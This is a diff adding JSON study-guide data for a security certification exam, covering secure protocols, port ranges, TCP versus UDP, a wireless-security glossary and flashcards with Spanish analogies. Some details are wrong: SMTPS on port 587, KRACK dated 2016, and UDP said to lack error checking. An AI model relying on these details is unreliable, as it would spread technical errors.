+                "HTTP (port 80)",
+                "HTTPS (port 443)"
+              ],
+              [
+                "File transfer",
+                "FTP",
+                "SFTP (encrypted via SSH tunnel)"
+              ],
+              [
+                "Remote CLI admin",
+                "Telnet",
+                "SSH"
+              ],
+              [
+                "Send email",
+                "SMTP (port 25)",
+                "SMTPS (port 587)"
+              ],
+              [
+                "Receive email (download)",
+                "POP3 (port 110)",
+                "POP3S (port 995)"
+              ],
+              [
+                "Receive email (server-side)",
+                "IMAP (port 143)",
+                "IMAPS (port 993)"
+              ]
+            ]
+          },
+          {
+            "headers": [
+              "Range",
+              "Ports",
+              "Description"
+            ],
+            "rows": [
+              [
+                "**Well-Known Ports**",
+                "0–1023",
+                "Reserved for system/core services (HTTP, HTTPS, SSH, etc.)"
+              ],
+              [
+                "**Registered Ports**",
+                "1024–49,151",
+                "Used by software applications"
+              ],
+              [
+                "**Dynamic / Private Ports**",
+                "49,152–65,535",
+                "Randomly assigned by the OS for client-side connections"
+              ]
+            ]
+          },
+          {
+            "headers": [
+              "Characteristic",
+              "TCP",
+              "UDP"
+            ],
+            "rows": [
+              [
+                "**Connection**",
+                "Connection-oriented (handshake)",
+                "Connectionless"
+              ],
+              [
+                "**Delivery guarantee**",
+                "Yes — acknowledgements + retransmission",
+                "No"
+              ],
+              [
+                "**Error checking**",
+                "Yes",
+                "No"
+              ],
+              [
+                "**Speed**",
+                "Slower (overhead)",
+                "Faster (low overhead)"
+              ],
+              [
+                "**Use cases**",
+                "Web, email, file transfer",
+                "Video streaming, VoIP, gaming"
+              ]
+            ]
+          }
+        ],
+        "list_items": [],
+        "raw_content": "* **Definition:** The objective domain (4.5) covering the process of choosing encrypted protocols, appropriate ports, and the correct transport method to ensure that data confidentiality, integrity, and reliability are maintained across an enterprise network.\n\nThis objective covers three independent decisions an architect must make: **protocol selection** (encrypted vs. plaintext), **port selection** (which logical port and range to use), and **transport method selection** (TCP vs. UDP).\n\n> *Como elegir entre enviar dinero en efectivo por correo ordinario o en un sobre blindado con rastreo: ambos llegan, pero solo uno es seguro.*\n\n### Selecting Secure Protocols: Protocol Selection\n\n* **Definition:** The practice of choosing encrypted, authenticated network protocols over their plaintext equivalents to ensure data confidentiality, integrity, and authenticity during transmission across networks.\n\nThe fundamental rule: **always choose the encrypted version of a protocol** when one is available. Most secure protocols are simply the insecure version with an \"S\" appended (HTTPS, SFTP, SMTPS, IMAPS, POP3S, SNMPS). **Telnet vs. SSH** is a notable exception to the \"just add S\" naming pattern — Telnet transmits everything (including login credentials) in plaintext, vulnerable to on-path/eavesdropping attacks, while SSH encrypts the entire session using strong passwords and public key authentication.\n\n| Use Case                    | Insecure Protocol | Secure Protocol                 |\n| --------------------------- | ----------------- | ------------------------------- |\n| Web browsing                | HTTP (port 80)    | HTTPS (port 443)                |\n| File transfer               | FTP               | SFTP (encrypted via SSH tunnel) |\n| Remote CLI admin            | Telnet            | SSH                             |\n| Send email                  | SMTP (port 25)    | SMTPS (port 587)                |\n| Receive email (download)    | POP3 (port 110)   | POP3S (port 995)                |\n| Receive email (server-side) | IMAP (port 143)   | IMAPS (port 993)                |\n\n### Selecting Secure Protocols: Port Selection\n\n* **Definition:** The process of assigning logical port numbers to network services and protocols, following the principle of least privilege by opening only ports required for authorized applications and blocking all others to minimize the attack surface.\n\nPorts are categorized into three ranges:\n\n| Range                       | Ports         | Description                                                |\n| --------------------------- | ------------- | ---------------------------------------------------------- |\n| **Well-Known Ports**        | 0–1023        | Reserved for system/core services (HTTP, HTTPS, SSH, etc.) |\n| **Registered Ports**        | 1024–49,151   | Used by software applications                              |\n| **Dynamic / Private Ports** | 49,152–65,535 | Randomly assigned by the OS for client-side connections    |\n\n> *Como los canales de radio: los bien conocidos son la AM/FM estándar que todo el mundo conoce; los registrados son los canales de cable asignados; los dinámicos son frecuencias temporales que el sistema asigna según necesidad.*\n\n**Using non-default ports:** Some organizations use non-standard port numbers (e.g., port 8888 for HTTP) to add obscurity. This provides minimal security benefit and should **never replace** proper authentication, encryption, and patching. It also increases administrative and troubleshooting complexity.\n\n⚠️ **Exam Tip:** Follow the **principle of least privilege** for ports — open only what is necessary for each application. Block everything else on the firewall.\n\n### Selecting Secure Protocols: Transport Method Selection (TCP vs. UDP)\n\n* **Definition:** The choice between TCP (Transmission Control Protocol) and UDP (User Datagram Protocol) as the transport layer method for data transmission, based on whether data integrity or transmission speed is the higher priority for the application.\n\n> *Como elegir entre un servicio de mensajería con confirmación de entrega (TCP) y un reparto masivo de volantes sin seguimiento (UDP): uno garantiza que llegó; el otro es más rápido pero no verifica.*\n\n#### Transport Method: TCP\n\n* **Definition:** A connection-oriented transport layer protocol that establishes a connection before transmitting data, uses acknowledgements, sequencing, and retransmission to guarantee error-free, in-order data delivery.\n\nTCP is used when **data accuracy is paramount**: web servers, email servers, file transfers. It adds overhead but ensures that every packet arrives correctly and in the right order.\n\n#### Transport Method: UDP\n\n* **Definition:** A connectionless transport layer protocol that sends data without establishing a connection, provides no error checking or guaranteed delivery, and prioritizes transmission speed over accuracy.\n\nUDP is used when **speed matters more than perfect accuracy**: streaming video, VoIP, online gaming. Lost packets in video streaming typically go unnoticed by the human eye (30 FPS; losing 1 frame is imperceptible).\n\n| Characteristic         | TCP                                     | UDP                           |\n| ---------------------- | --------------------------------------- | ----------------------------- |\n| **Connection**         | Connection-oriented (handshake)         | Connectionless                |\n| **Delivery guarantee** | Yes — acknowledgements + retransmission | No                            |\n| **Error checking**     | Yes                                     | No                            |\n| **Speed**              | Slower (overhead)                       | Faster (low overhead)         |\n| **Use cases**          | Web, email, file transfer               | Video streaming, VoIP, gaming |\n\n---"
+      },
+      {
+        "name": "Key Terms Glossary",
+        "definition": "WAP: Wireless Access Point — device allowing wireless connection to a wired network via 802.11",
+        "analogy": "",
+        "tables": [
+          {
+            "headers": [
+              "Term",
+              "Definition"
+            ],
+            "rows": [
+              [
+                "**WAP**",
+                "Wireless Access Point — device allowing wireless connection to a wired network via 802.11"
+              ],
+              [
+                "**ESS**",
+                "Extended Service Set — multiple WAPs working together to provide merged wireless coverage"
+              ],
+              [
+                "**Co-channel interference**",
+                "Interference from two WAPs using the same channel in overlapping coverage areas"
+              ],
+              [
+                "**Adjacent channel interference**",
+                "Interference from WAPs using channels close enough in frequency to overlap"
+              ],
+              [
+                "**Site survey**",
+                "RF environment assessment to plan optimal WAP placement and channel selection"
+              ],
+              [
+                "**Heat map**",
+                "Graphical visualization of wireless signal strength and coverage across a physical space"
+              ],
+              [
+                "**WEP**",
+                "Wired Equivalent Privacy — broken wireless encryption; weak 24-bit IV"
+              ],
+              [
+                "**WPA**",
+                "Wi-Fi Protected Access — interim replacement for WEP; uses TKIP"
+              ],
+              [
+                "**WPA2**",
+                "Wi-Fi Protected Access 2 — uses AES + CCMP; vulnerable to KRACK"
+              ],
+              [
+                "**WPA3**",
+                "Wi-Fi Protected Access 3 — current standard; SAE, Enhanced Open, AES-GCMP, MFP"
+              ],
+              [
+                "**SAE**",
+                "Simultaneous Authentication of Equals — WPA3 key exchange based on Diffie-Hellman"
+              ],
+              [
+                "**OWE**",
+                "Opportunistic Wireless Encryption / Enhanced Open — per-client encryption on open networks"
+              ],
+              [
+                "**MFP**",
+                "Management Frame Protection — encrypts wireless management frames in WPA3"
+              ],
+              [
+                "**TKIP**",
+                "Temporal Key Integrity Protocol — WPA's per-packet key generation (now deprecated)"
+              ],
+              [
+                "**CCMP**",
+                "Counter Cipher Mode with Block Chaining MAC Protocol — WPA2 encryption mechanism"
+              ],
+              [
+                "**AES-GCMP**",
+                "Galois Counter Mode Protocol — WPA3's encryption (128-bit personal, 192-bit enterprise)"
+              ],
+              [
+                "**KRACK**",
+                "Key Reinstallation Attack — 2016 attack demonstrating WPA2 vulnerability"
+              ],
+              [
+                "**AAA**",
+                "Authentication, Authorization, Accounting — security framework for network access control"
+              ],
+              [
+                "**RADIUS**",
+                "Remote Authentication Dial-In User Service — centralized AAA via UDP"
+              ],
+              [
+                "**TACACS+**",
+                "Terminal Access Controller Access-Control System Plus — separates AAA; encrypts full payload via TCP"
+              ],
+              [
+                "**EAP**",
+                "Extensible Authentication Protocol — framework for multiple authentication methods"
+              ],
+              [
+                "**PEAP**",
+                "Protected EAP — wraps EAP in TLS tunnel; dual-sided certificates"
+              ],
+              [
+                "**EAP-TTLS**",
+                "EAP Tunneled TLS — server-only cert; transports second auth protocol inside tunnel"
+              ],
+              [
+                "**EAP-FAST**",
+                "EAP Flexible Authentication via Secure Tunneling — Cisco; uses PACs for fast re-auth"
+              ],
+              [
+                "**Application Security**",
+                "Blueprint objective covering input validation, secure cookies, SAST, DAST, code signing, sandboxing"
+              ],
+              [
+                "**Input validation**",
+                "Ensuring all application inputs meet defined criteria before processing"
+              ],
+              [
+                "**Secure cookies**",
+                "Cookies configured with Secure, HttpOnly, and SameSite attributes"
+              ],
+              [
+                "**SAST**",
+                "Static Application Security Testing — source code analysis before execution"
+              ],
+              [
+                "**DAST**",
+                "Dynamic Application Security Testing — analysis of running application"
+              ],
+              [
+                "**Fuzzing**",
+                "Injecting random/malformed data to discover crashes and security flaws"
+              ],
+              [
+                "**Stress testing**",
+                "Evaluating system stability under extreme load conditions"
+              ],
+              [
+                "**Code signing**",
+                "Using a digital signature to confirm software author identity and code integrity"
+              ],
+              [
+                "**Sandboxing**",
+                "Isolating untrusted code in a restricted environment to prevent system harm"
+              ],
+              [
+                "**NAC**",
+                "Network Access Control — scans and enforces security posture before granting network access"
+              ],
+              [
+                "**802.1X**",
+                "IEEE standard for port-based network access control"
+              ],
+              [
+                "**Adaptive NAC**",
+                "Role-based NAC that re-evaluates authorization based on what the device is trying to do"
+              ],
+              [
+                "**Web filtering**",
+                "Restricting internet access by agent, proxy, URL scan, categorization, block rules, or reputation"
+              ],
+              [
+                "**DNS filtering**",
+                "Blocking website access by preventing DNS resolution of blacklisted domain names"
+              ],
+              [
+                "**DKIM**",
+                "DomainKeys Identified Mail — email header digital signature for sender/content verification"
+              ],
+              [
+                "**SPF**",
+                "Sender Policy Framework — validates sender IP against domain's authorized IP list in DNS"
+              ],
+              [
+                "**DMARC**",
+                "Domain-based Message Authentication, Reporting, and Conformance — policy for DKIM/SPF failures"
+              ],
+              [
+                "**SMTP**",
+                "Simple Mail Transfer Protocol — used by email gateways (port 25 insecure, port 587 secure)"
+              ],
+              [
+                "**Email gateway**",
+                "Entry/exit server for all organizational email — handles routing, security, and encryption"
+              ],
+              [
+                "**Spam filtering**",
+                "Detecting and blocking unwanted emails via content analysis, Bayesian filtering, and blocklists"
+              ],
+              [
+                "**EDR**",
+                "Endpoint Detection and Response — continuous endpoint monitoring and threat response"
+              ],
+              [
+                "**FIM**",
+                "File Integrity Monitoring — hash-based detection of unauthorized changes to critical files"
+              ],
+              [
+                "**XDR**",
+                "Extended Detection and Response — unified platform correlating endpoint, network, email, and cloud"
+              ],
+              [
+                "**UBA**",
+                "User Behavior Analytics — ML-based detection of anomalous user behavior"
+              ],
+              [
+                "**UEBA**",
+                "User and Entity Behavior Analytics — UBA extended to include network devices and entities"
+              ],
+              [
+                "**HTTPS**",
+                "HTTP Secure — encrypted web protocol using TLS; port 443"
+              ],
+              [
+                "**SFTP**",
+                "Secure File Transfer Protocol — file transfer over SSH tunnel"
+              ],
+              [
+                "**SSH**",
+                "Secure Shell — encrypted remote CLI administration protocol"
+              ],
+              [
+                "**SMTPS**",
+                "SMTP Secure — encrypted email sending; port 587"
+              ],
+              [
+                "**POP3S**",
+                "POP3 Secure — encrypted email retrieval (downloads); port 995"
+              ],
+              [
+                "**IMAPS**",
+                "IMAP Secure — encrypted server-side email access; port 993"
+              ],
+              [
+                "**TCP**",
+                "Transmission Control Protocol — connection-oriented; guaranteed, ordered, error-checked delivery"
+              ],
+              [
+                "**UDP**",
+                "User Datagram Protocol — connectionless; fast, no guarantee; used for streaming/gaming"
+              ]
+            ]
+          }
+        ],
+        "list_items": [],
+        "raw_content": "| Term                              | Definition                                                                                           |\n| --------------------------------- | ---------------------------------------------------------------------------------------------------- |\n| **WAP**                           | Wireless Access Point — device allowing wireless connection to a wired network via 802.11            |\n| **ESS**                           | Extended Service Set — multiple WAPs working together to provide merged wireless coverage            |\n| **Co-channel interference**       | Interference from two WAPs using the same channel in overlapping coverage areas                      |\n| **Adjacent channel interference** | Interference from WAPs using channels close enough in frequency to overlap                           |\n| **Site survey**                   | RF environment assessment to plan optimal WAP placement and channel selection                        |\n| **Heat map**                      | Graphical visualization of wireless signal strength and coverage across a physical space             |\n| **WEP**                           | Wired Equivalent Privacy — broken wireless encryption; weak 24-bit IV                                |\n| **WPA**                           | Wi-Fi Protected Access — interim replacement for WEP; uses TKIP                                      |\n| **WPA2**                          | Wi-Fi Protected Access 2 — uses AES + CCMP; vulnerable to KRACK                                      |\n| **WPA3**                          | Wi-Fi Protected Access 3 — current standard; SAE, Enhanced Open, AES-GCMP, MFP                       |\n| **SAE**                           | Simultaneous Authentication of Equals — WPA3 key exchange based on Diffie-Hellman                    |\n| **OWE**                           | Opportunistic Wireless Encryption / Enhanced Open — per-client encryption on open networks           |\n| **MFP**                           | Management Frame Protection — encrypts wireless management frames in WPA3                            |\n| **TKIP**                          | Temporal Key Integrity Protocol — WPA's per-packet key generation (now deprecated)                   |\n| **CCMP**                          | Counter Cipher Mode with Block Chaining MAC Protocol — WPA2 encryption mechanism                     |\n| **AES-GCMP**                      | Galois Counter Mode Protocol — WPA3's encryption (128-bit personal, 192-bit enterprise)              |\n| **KRACK**                         | Key Reinstallation Attack — 2016 attack demonstrating WPA2 vulnerability                             |\n| **AAA**                           | Authentication, Authorization, Accounting — security framework for network access control            |\n| **RADIUS**                        | Remote Authentication Dial-In User Service — centralized AAA via UDP                                 |\n| **TACACS+**                       | Terminal Access Controller Access-Control System Plus — separates AAA; encrypts full payload via TCP |\n| **EAP**                           | Extensible Authentication Protocol — framework for multiple authentication methods                   |\n| **PEAP**                          | Protected EAP — wraps EAP in TLS tunnel; dual-sided certificates                                     |\n| **EAP-TTLS**                      | EAP Tunneled TLS — server-only cert; transports second auth protocol inside tunnel                   |\n| **EAP-FAST**                      | EAP Flexible Authentication via Secure Tunneling — Cisco; uses PACs for fast re-auth                 |\n| **Application Security**          | Blueprint objective covering input validation, secure cookies, SAST, DAST, code signing, sandboxing  |\n| **Input validation**              | Ensuring all application inputs meet defined criteria before processing                              |\n| **Secure cookies**                | Cookies configured with Secure, HttpOnly, and SameSite attributes                                    |\n| **SAST**                          | Static Application Security Testing — source code analysis before execution                          |\n| **DAST**                          | Dynamic Application Security Testing — analysis of running application                               |\n| **Fuzzing**                       | Injecting random/malformed data to discover crashes and security flaws                               |\n| **Stress testing**                | Evaluating system stability under extreme load conditions                                            |\n| **Code signing**                  | Using a digital signature to confirm software author identity and code integrity                     |\n| **Sandboxing**                    | Isolating untrusted code in a restricted environment to prevent system harm                          |\n| **NAC**                           | Network Access Control — scans and enforces security posture before granting network access          |\n| **802.1X**                        | IEEE standard for port-based network access control                                                  |\n| **Adaptive NAC**                  | Role-based NAC that re-evaluates authorization based on what the device is trying to do              |\n| **Web filtering**                 | Restricting internet access by agent, proxy, URL scan, categorization, block rules, or reputation    |\n| **DNS filtering**                 | Blocking website access by preventing DNS resolution of blacklisted domain names                     |\n| **DKIM**                          | DomainKeys Identified Mail — email header digital signature for sender/content verification          |\n| **SPF**                           | Sender Policy Framework — validates sender IP against domain's authorized IP list in DNS             |\n| **DMARC**                         | Domain-based Message Authentication, Reporting, and Conformance — policy for DKIM/SPF failures       |\n| **SMTP**                          | Simple Mail Transfer Protocol — used by email gateways (port 25 insecure, port 587 secure)           |\n| **Email gateway**                 | Entry/exit server for all organizational email — handles routing, security, and encryption           |\n| **Spam filtering**                | Detecting and blocking unwanted emails via content analysis, Bayesian filtering, and blocklists      |\n| **EDR**                           | Endpoint Detection and Response — continuous endpoint monitoring and threat response                 |\n| **FIM**                           | File Integrity Monitoring — hash-based detection of unauthorized changes to critical files           |\n| **XDR**                           | Extended Detection and Response — unified platform correlating endpoint, network, email, and cloud   |\n| **UBA**                           | User Behavior Analytics — ML-based detection of anomalous user behavior                              |\n| **UEBA**                          | User and Entity Behavior Analytics — UBA extended to include network devices and entities            |\n| **HTTPS**                         | HTTP Secure — encrypted web protocol using TLS; port 443                                             |\n| **SFTP**                          | Secure File Transfer Protocol — file transfer over SSH tunnel                                        |\n| **SSH**                           | Secure Shell — encrypted remote CLI administration protocol                                          |\n| **SMTPS**                         | SMTP Secure — encrypted email sending; port 587                                                      |\n| **POP3S**                         | POP3 Secure — encrypted email retrieval (downloads); port 995                                        |\n| **IMAPS**                         | IMAP Secure — encrypted server-side email access; port 993                                           |\n| **TCP**                           | Transmission Control Protocol — connection-oriented; guaranteed, ordered, error-checked delivery     |\n| **UDP**                           | User Datagram Protocol — connectionless; fast, no guarantee; used for streaming/gaming               |"
+      }
+    ],
+    "flashcards": [
+      {
+        "name": "Wireless Infrastructure Security",
+        "definition": "The objective domain covering the physical placement, RF planning, and survey methodology used to deploy a wireless network that maximizes coverage while minimizing the risk of unauthorized external access.",
+        "analogy": "*Es como diseñar la seguridad perimetral de una casa antes de comprar las cerraduras: primero decides dónde van las ventanas y las puertas, y después eliges qué candado poner en cada una.*",
+        "raw_content": "* **Definition:** The objective domain covering the physical placement, RF planning, and survey methodology used to deploy a wireless network that maximizes coverage while minimizing the risk of unauthorized external access.\n\nThis is one of the core blueprint objectives (4.1) for this section. It covers **WAP placement**, **interference types**, **site surveys**, and **heat maps** as the building blocks of a secure wireless deployment — security starts at the physical/RF layer, before any encryption protocol is even configured.\n\n> *Es como diseñar la seguridad perimetral de una casa antes de comprar las cerraduras: primero decides dónde van las ventanas y las puertas, y después eliges qué candado poner en cada una.*"
+      },
+      {
+        "name": "Wireless Infrastructure Security: WAP Placement",
+        "definition": "The strategic positioning of wireless access points (WAPs) within a facility to optimize signal coverage while minimizing the risk of unauthorized external access.",
+        "analogy": "*Es como instalar reflectores de luz en un estadio: si los pones demasiado cerca de las paredes externas, iluminas el estacionamiento en lugar del campo.*",
+        "raw_content": "* **Definition:** The strategic positioning of wireless access points (WAPs) within a facility to optimize signal coverage while minimizing the risk of unauthorized external access.\n\nA **Wireless Access Point (WAP)** is a device that allows wireless clients to connect to a wired network using the 802.11 Wi-Fi standards. Where you place a WAP directly affects both **performance** and **security**.\n\n> *Es como instalar reflectores de luz en un estadio: si los pones demasiado cerca de las paredes externas, iluminas el estacionamiento en lugar del campo.*\n\nPlacing a WAP near **exterior walls or windows** allows the signal to leak outside the physical boundaries of the building, letting threat actors connect from a parking lot or sidewalk without ever entering the facility.\n\n**Best practices for WAP placement:**\n\n- Place WAPs in **central locations**, away from windows and external walls.\n- Mount WAPs **high** (ceiling or top of shelves) to maximize coverage and reduce interference.\n- Use **omnidirectional antennas** for interior areas and **unidirectional antennas** on exterior walls to focus the signal inward.\n- Large facilities require an **Extended Service Set (ESS)** — multiple WAPs working together to provide seamless, merged coverage across the entire building, automatically handing off the user as they move between WAPs while remaining on the same enterprise network."
+      },
+      {
+        "name": "Wireless Infrastructure Security: Co-Channel Interference",
+        "definition": "Interference that occurs when two or more WAPs in overlapping coverage areas use the same wireless channel or frequency band.",
+        "analogy": "*Como dos personas hablando al mismo tiempo en el mismo cuarto: se escucha ruido, no información.*",
+        "raw_content": "* **Definition:** Interference that occurs when two or more WAPs in overlapping coverage areas use the same wireless channel or frequency band.\n\nCo-channel interference forces data retransmission, slowing down the wireless network. It occurs when two access points use the **same channel** while their coverage zones overlap.\n\n> *Como dos personas hablando al mismo tiempo en el mismo cuarto: se escucha ruido, no información.*"
+      },
+      {
+        "name": "Wireless Infrastructure Security: Adjacent Channel Interference",
+        "definition": "Interference that occurs when adjacent WAPs use channels that are close enough to overlap in frequency, causing signal degradation and bandwidth loss.",
+        "analogy": "*Como dos estaciones de radio muy cercanas en el dial: se mezclan las señales y escuchas ambas a la vez.*",
+        "raw_content": "* **Definition:** Interference that occurs when adjacent WAPs use channels that are close enough to overlap in frequency, causing signal degradation and bandwidth loss.\n\nIn the **2.4 GHz band**, there are only 11 channels available, each 22 MHz wide, across a 100 MHz total spectrum — which means most channels overlap with their neighbors. For example, channel 6 (centered at 2.437 GHz) strongly overlaps with channels 5 and 7, and overlaps slightly with channels 4 and 8.\n\n> *Como dos estaciones de radio muy cercanas en el dial: se mezclan las señales y escuchas ambas a la vez.*\n\n⚠️ **Exam Tip:** In the 2.4 GHz band, always use **channels 1, 6, and 11** — the only three non-overlapping channels. Any other combination will cause adjacent channel interference."
+      },
+      {
+        "name": "Wireless Infrastructure Security: Site Survey",
+        "definition": "A process of planning and designing a wireless network that involves scanning the radio frequency environment to identify interference sources, optimal WAP placement locations, and the best channels to use, in order to deliver required coverage, data rates, capacity, roaming capability, and quality of service.",
+        "analogy": "*Es como hacer una inspección del terreno antes de construir: mides, observas el entorno y luego decides dónde colocar cada cosa.*",
+        "raw_content": "* **Definition:** A process of planning and designing a wireless network that involves scanning the radio frequency environment to identify interference sources, optimal WAP placement locations, and the best channels to use, in order to deliver required coverage, data rates, capacity, roaming capability, and quality of service.\n\nA site survey is performed **before** installing wireless access points. It involves a physical site visit to test RF interference and identify devices already operating in the frequency band you intend to use.\n\n> *Es como hacer una inspección del terreno antes de construir: mides, observas el entorno y luego decides dónde colocar cada cosa.*"
+      },
+      {
+        "name": "Wireless Infrastructure Security: Heat Map",
+        "definition": "A graphical representation of wireless signal strength, coverage, and frequency utilization across a physical space, with values displayed as color gradients, created after WAP installation to validate the deployment.",
+        "analogy": "*Como un mapa meteorológico: los colores te dicen de inmediato dónde hace calor (señal fuerte) y dónde hace frío (sin cobertura).*",
+        "raw_content": "* **Definition:** A graphical representation of wireless signal strength, coverage, and frequency utilization across a physical space, with values displayed as color gradients, created after WAP installation to validate the deployment.\n\nHeat maps allow security professionals and network engineers to:\n\n- Identify **dead zones** (no coverage)\n- Detect areas of **signal leakage** outside the building\n- Find areas where **signal strength is too strong** and could reach beyond physical boundaries\n\n> *Como un mapa meteorológico: los colores te dicen de inmediato dónde hace calor (señal fuerte) y dónde hace frío (sin cobertura).*\n\n⚠️ **Exam Tip:** If a heat map shows signal leaking outside the building, the response is to **reposition the WAP**, **decrease signal strength**, or switch to a **unidirectional antenna**. If coverage is insufficient inside, **add more WAPs** near the weak edges.\n\n---"
+      },
+      {
+        "name": "Wireless Security Settings",
+        "definition": "The objective domain covering the encryption protocols, AAA frameworks, and authentication protocols used to secure data transmission and verify user identity on wireless networks.",
+        "analogy": "*Como construir una caja fuerte de tres capas: el material de la caja (encriptación), quién tiene permiso de abrirla (AAA), y cómo se verifica la identidad de quien la abre (EAP).*",
+        "raw_content": "* **Definition:** The objective domain covering the encryption protocols, AAA frameworks, and authentication protocols used to secure data transmission and verify user identity on wireless networks.\n\nThis is the second blueprint objective (4.1) covered in this section. It addresses three layers of wireless protection: **encryption protocols** (WEP/WPA/WPA2/WPA3) for confidentiality, **AAA protocols** (RADIUS/TACACS+) for centralized access control, and **EAP-based authentication protocols** for verifying user identity.\n\n> *Como construir una caja fuerte de tres capas: el material de la caja (encriptación), quién tiene permiso de abrirla (AAA), y cómo se verifica la identidad de quien la abre (EAP).*"
+      },
+      {
+        "name": "Wireless Security Settings: WEP",
+        "definition": "Wired Equivalent Privacy — the original 802.11 wireless encryption standard released in 1999, now considered cryptographically broken due to its weak initialization vector and use of the RC4 cipher.",
+        "analogy": "*Como poner el mismo candado en todas las puertas del edificio y además escribir la combinación en la puerta misma.*",
+        "raw_content": "* **Definition:** Wired Equivalent Privacy — the original 802.11 wireless encryption standard released in 1999, now considered cryptographically broken due to its weak initialization vector and use of the RC4 cipher.\n\nWEP uses a **static key** shared by all devices on the network. It supports 64-bit and 128-bit key lengths, but both are easily compromised because of its **24-bit initialization vector (IV)**. Modern tools can crack WEP in approximately 3 minutes by collecting enough traffic to reconstruct the key.\n\n> *Como poner el mismo candado en todas las puertas del edificio y además escribir la combinación en la puerta misma.*\n\n⚠️ **Exam Tip:** WEP is insecure because of its **weak 24-bit IV**. Never use WEP."
+      },
+      {
+        "name": "Wireless Security Settings: WPA",
+        "definition": "Wi-Fi Protected Access — an interim wireless security standard released in 2003 that replaced WEP by introducing TKIP (Temporal Key Integrity Protocol), which generates a new 128-bit key per packet.",
+        "analogy": "*Como reparar un puente viejo con parches: mejora, pero la estructura base sigue siendo débil.*",
+        "raw_content": "* **Definition:** Wi-Fi Protected Access — an interim wireless security standard released in 2003 that replaced WEP by introducing TKIP (Temporal Key Integrity Protocol), which generates a new 128-bit key per packet.\n\nWPA was a stopgap solution while the 802.11i standard was being finalized. Although TKIP improved on WEP, it was designed to be backward compatible with existing WEP hardware, which meant it inherited structural weaknesses.\n\n> *Como reparar un puente viejo con parches: mejora, pero la estructura base sigue siendo débil.*\n\n⚠️ **Exam Tip:** WPA is insecure because of **insufficient data integrity checks in the TKIP implementation**."
+      },
+      {
+        "name": "Wireless Security Settings: WPA2",
+        "definition": "Wi-Fi Protected Access 2 — the wireless security standard released in 2004 based on the IEEE 802.11i standard, which replaced TKIP with AES encryption and introduced CCMP (Counter Cipher Mode with Block Chaining Message Authentication Code Protocol).",
+        "analogy": "*Como mejorar la bóveda del banco: ahora tiene acero de verdad, pero alguien encontró una grieta en el proceso de instalación de la llave.*",
+        "raw_content": "* **Definition:** Wi-Fi Protected Access 2 — the wireless security standard released in 2004 based on the IEEE 802.11i standard, which replaced TKIP with AES encryption and introduced CCMP (Counter Cipher Mode with Block Chaining Message Authentication Code Protocol).\n\nWPA2 brought the **Advanced Encryption Standard (AES)** and **CCMP** for stronger encryption and data integrity via **Message Integrity Code (MIC)**. The primary vulnerability is the **KRACK (Key Reinstallation Attack)** discovered in 2016.\n\n> *Como mejorar la bóveda del banco: ahora tiene acero de verdad, pero alguien encontró una grieta en el proceso de instalación de la llave.*"
+      },
+      {
+        "name": "Wireless Security Settings: WPA3",
+        "definition": "Wi-Fi Protected Access 3 — the current and most secure wireless encryption standard, which introduces Simultaneous Authentication of Equals (SAE), Enhanced Open (OWE), AES-GCMP encryption, and mandatory Management Frame Protection (MFP).",
+        "analogy": "*Como cambiar el candado de una contraseña estática por autenticación biométrica con reconocimiento facial: incluso si alguien graba el proceso, no puede replicarlo.*",
+        "raw_content": "* **Definition:** Wi-Fi Protected Access 3 — the current and most secure wireless encryption standard, which introduces Simultaneous Authentication of Equals (SAE), Enhanced Open (OWE), AES-GCMP encryption, and mandatory Management Frame Protection (MFP).\n\nWPA3 includes **four major improvements** over WPA2, each detailed below as its own concept.\n\n> *Como cambiar el candado de una contraseña estática por autenticación biométrica con reconocimiento facial: incluso si alguien graba el proceso, no puede replicarlo.*"
+      },
+      {
+        "name": "WPA3: Simultaneous Authentication of Equals (SAE)",
+        "definition": "A key establishment protocol in WPA3 that replaces the WPA2 four-way handshake with a Diffie-Hellman-based authentication mechanism, protecting against offline dictionary attacks even if the handshake is captured.",
+        "analogy": "*Como un apretón de manos matemático que cambia cada vez: grabar el apretón no te da la fórmula para reproducirlo.*",
+        "raw_content": "* **Definition:** A key establishment protocol in WPA3 that replaces the WPA2 four-way handshake with a Diffie-Hellman-based authentication mechanism, protecting against offline dictionary attacks even if the handshake is captured.\n\nSAE replaces the pre-shared key (PSK) method used in WPA2. Even if an attacker captures the authentication exchange, they **cannot use it to guess the password offline** — unlike WPA2 where a captured handshake can be brute-forced. WPA3 also offers more robust protection even when users select weak, simple, or short passwords.\n\n> *Como un apretón de manos matemático que cambia cada vez: grabar el apretón no te da la fórmula para reproducirlo.*"
+      },
+      {
+        "name": "WPA3: Enhanced Open (Opportunistic Wireless Encryption — OWE)",
+        "definition": "A WPA3 feature that provides individualized data encryption between a client and an access point on open (password-free) networks, protecting against passive eavesdropping without requiring user authentication.",
+        "analogy": "*Como que cada persona en un café reciba su propia mesa privada con cortinas, aunque la entrada al café sea libre.*",
+        "raw_content": "* **Definition:** A WPA3 feature that provides individualized data encryption between a client and an access point on open (password-free) networks, protecting against passive eavesdropping without requiring user authentication.\n\nTraditional open Wi-Fi sends all data unencrypted. Enhanced Open encrypts each client's traffic individually, even though no password is required to join. It does not offer full WPA3-level security, but protects against passive eavesdropping common in public Wi-Fi.\n\n> *Como que cada persona en un café reciba su propia mesa privada con cortinas, aunque la entrada al café sea libre.*"
+      },
+      {
+        "name": "WPA3: Updated Cryptographic Protocols (AES-GCMP)",
+        "definition": "WPA3 replaces the AES-CCMP used in WPA2 with AES-GCMP (Galois Counter Mode Protocol), supporting 128-bit AES for personal networks and 192-bit AES for enterprise networks.",
+        "analogy": "",
+        "raw_content": "* **Definition:** WPA3 replaces the AES-CCMP used in WPA2 with AES-GCMP (Galois Counter Mode Protocol), supporting 128-bit AES for personal networks and 192-bit AES for enterprise networks.\n\nGCMP provides stronger encryption and better performance than CCMP. The 192-bit option is used in WPA3-Enterprise for environments requiring stronger cryptographic assurance."
+      },
+      {
+        "name": "Wireless Security Settings: AAA — Authentication, Authorization, and Accounting",
+        "definition": "A security framework that controls access to network resources by verifying user identity (Authentication), determining what the user is allowed to do (Authorization), and tracking user activity (Accounting).",
+        "analogy": "*Como el sistema de un aeropuerto: la seguridad verifica quién eres (Autenticación), el boarding pass define a qué puerta puedes ir (Autorización), y el registro de vuelo documenta todo lo que hiciste (Accounting).*",
